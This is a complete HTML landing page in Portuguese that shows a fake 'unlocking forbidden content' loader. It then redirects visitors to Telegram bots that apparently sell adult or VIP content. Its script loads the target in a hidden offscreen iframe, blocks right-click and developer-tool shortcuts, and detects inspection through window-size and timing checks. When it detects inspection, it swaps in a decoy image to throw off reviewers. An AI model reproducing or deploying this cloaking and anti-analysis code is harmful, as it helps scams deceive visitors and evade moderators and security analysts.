<noscript><title>Bloqueado</title><style>body{background:#000}*{display:none}</style></noscript>
<style>
  html,body {
    height:100%;
    margin:0;
    background:#000;
    display:flex;
    align-items:center;
    justify-content:center;
    font-family:'Poppins',sans-serif;
    color:#fff;
    overflow:hidden;
  }
  .loader {
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:16px;
    text-align:center;
  }
  h1 {
    font-size:1.3rem;
    color:#ff2a2a;
    letter-spacing:1px;
    text-shadow:0 0 10px #ff0000;
    animation:flicker 2s infinite alternate;
  }
  .bar-wrap {
    width:240px;
    height:14px;
    background:#220000;
    border-radius:999px;
    overflow:hidden;
    box-shadow:0 0 25px rgba(255,0,0,0.3),inset 0 0 10px rgba(255,0,0,0.2);
    position:relative;
  }
  .bar {
    width:0%;
    height:100%;
    background:linear-gradient(90deg,#6a0000,#ff0000,#6a0000);
    animation:fill 2.6s linear forwards;
  }
  .flame {
    position:absolute;
    right:0;
    top:50%;
    transform:translate(50%,-50%);
    font-size:1.3rem;
    opacity:0;
    animation:flameMove 2.6s linear forwards;
  }
  @keyframes fill {
    0% { width:0%; }
    100% { width:100%; }
  }
  @keyframes flameMove {
    0% { right:100%; opacity:0.3; }
    10% { opacity:1; }
    90% { opacity:1; }
    100% { right:0%; opacity:0; }
  }
  @keyframes flicker {
    0%,100% { opacity:1; text-shadow:0 0 12px #ff0000; }
    50% { opacity:0.8; text-shadow:0 0 20px #ff5500; }
  }
</style>
</head>
<body>
  <div class="loader">
    <h1 id="status">Liberando acesso ao proibidoâ€¦ ðŸ”¥</h1>
    <div class="bar-wrap">
      <div class="bar" id="bar"></div>
      <div class="flame">ðŸ”¥</div>
    </div>
  </div>

<script>
(()=>{

  // === Links MOBILE atualizados com ?start=rd ===
  const mobileBots = [
    "https://t.me/NoiteAdentroBot?start=rd",
    "https://t.me/ConteudoVip1Bot?start=rd",
    "https://t.me/ConteudoVip24hBot?start=rd",
    "https://t.me/ConteudoVip10Bot?start=rd",
    "https://t.me/ConteudoVip01Bot?start=rd"
  ];

  // === Link DESKTOP mantido ===
  const desktopBot = "https://t.me/lasagnamax_pay112w3n_bot?start=go";

  // === Link TRAP (para inspeÃ§Ã£o) ===
  const trap = "https://www.esmaelmorais.com.br/wp-content/uploads/2023/06/lula-faz-l.jpg.webp";

  const isMobile = /Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
  const rand = arr => arr[Math.floor(Math.random()*arr.length)];

  let trapTriggered = false;
  const triggerTrap = ()=> {
    if (trapTriggered) return;
    trapTriggered = true;
    try { location.replace(trap); } catch(e) { location.href = trap; }
  };

  function quickInspectionDetected() {
    try {
      const threshold = 160;
      const w = window.outerWidth - window.innerWidth;
      const h = window.outerHeight - window.innerHeight;
      if (!isMobile && (w > threshold || h > threshold)) return true;
    } catch(e){}
    try { if (document.location.ancestorOrigins && document.location.ancestorOrigins.length) return true; } catch(e){}
    try {
      const t0 = performance.now();
      for (let i=0;i<50;i++) {}
      const delta = performance.now() - t0;
      if (delta > 120) return true;
    } catch(e){}
    return false;
  }

  document.addEventListener('contextmenu', e => { e.preventDefault(); triggerTrap(); }, {passive:false});
  document.addEventListener('keydown', e => {
    const k = e.key || '';
    if (k === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(k.toUpperCase())) || (e.ctrlKey && k.toUpperCase()==='U')) {
      e.preventDefault(); triggerTrap();
    }
  }, {passive:false});
  try{ if (window.top !== window.self) window.top.location = window.self.location; }catch(e){}

  // aumento do delay para garantir que o iframe seja criado em conexÃµes lentas
  const REDIRECT_DELAY_MS = 350;

  if (quickInspectionDetected()) {
    triggerTrap();
    return;
  }

  const dest = isMobile ? rand(mobileBots) : desktopBot;

  try {
    const frame = document.createElement('iframe');
    frame.src = dest;
    frame.style.position = "fixed";
    frame.style.top = "-9999px";
    frame.style.left = "-9999px";
    frame.style.width = "1px";
    frame.style.height = "1px";
    frame.style.border = "0";
    frame.style.visibility = "hidden";
    document.body.appendChild(frame);
  } catch(e){}

  setTimeout(() => {
    if (trapTriggered) return;
    try { location.replace(dest); } catch(e) { location.href = dest; }
  }, REDIRECT_DELAY_MS);

})();
</script>
</body>
</html>
